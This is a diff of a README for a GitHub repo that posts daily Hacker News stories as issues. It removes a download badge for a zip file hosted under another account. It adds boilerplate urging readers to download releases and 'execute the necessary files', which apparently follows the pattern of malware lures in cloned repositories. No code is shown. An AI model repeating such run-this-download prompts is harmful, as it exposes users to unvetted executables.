@@ -1,18 +1,58 @@
+# Daily Hacker News: Stay Updated with Top Stories 🚀
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&labelColor=green)
-](https://github.com/senatorpage-100t8/daily-hackernews/releases/download/v1.0.0/file.zip)
- 
+![Hacker News](https://img.shields.io/badge/Hacker%20News-Daily%20Updates-orange)
 
-# Daily Hacker News
+Welcome to the **Daily Hacker News** repository! Here, you can subscribe to the top stories from Hacker News each day. By watching this repo, you will receive updates on the latest and most relevant news in the tech world. 
 
-## How to use
+## Table of Contents
 
-Fetch top 25 stories everyday and record them in issues. You can subscribe it by watching this repo.
+- [Getting Started](#getting-started)
+- [Features](#features)
+- [How to Subscribe](#how-to-subscribe)
+- [Releases](#releases)
+- [Contributing](#contributing)
+- [License](#license)
 
-## How does it work
+## Getting Started
 
-1. A script fetches top 25 stories on hackernews everyday
-2. Use github REST api open an issue
-3. create github Action to run it automatically.
+To get started, simply follow these steps:
 
+1. **Watch this repository** to receive daily updates.
+2. Check the latest top stories posted here.
+3. Engage with the community by discussing the stories.
 
+## Features
+
+- Daily updates on the top stories from Hacker News.
+- Easy access to trending topics in technology and startup culture.
+- Community discussions to enhance understanding and insights.
+
+## How to Subscribe
+
+To subscribe to the daily top stories, just click the "Watch" button at the top right of this repository. You will then receive notifications whenever new stories are posted.
+
+## Releases
+
+For the latest releases, visit the [Releases section](https://github.com/Ariefed/daily-hackernews/releases). Here, you can download the latest updates and execute the necessary files to stay in the loop with Hacker News.
+
+![Releases](https://img.shields.io/badge/Releases-Click%20Here-blue)
+
+## Contributing
+
+We welcome contributions! If you have suggestions or improvements, feel free to fork the repository and submit a pull request. Make sure to follow these guidelines:
+
+- Ensure your code is clean and well-documented.
+- Write clear commit messages.
+- Test your changes before submitting.
+
+## License
+
+This project is licensed under the MIT License. See the LICENSE file for details.
+
+## Stay Connected
+
+For more updates, make sure to keep an eye on the [Releases section](https://github.com/Ariefed/daily-hackernews/releases). 
+
+![Stay Updated](https://img.shields.io/badge/Stay%20Updated-Join%20Us%20Now-brightgreen) 
+
+Thank you for being part of the Daily Hacker News community! Your engagement helps keep everyone informed and connected.
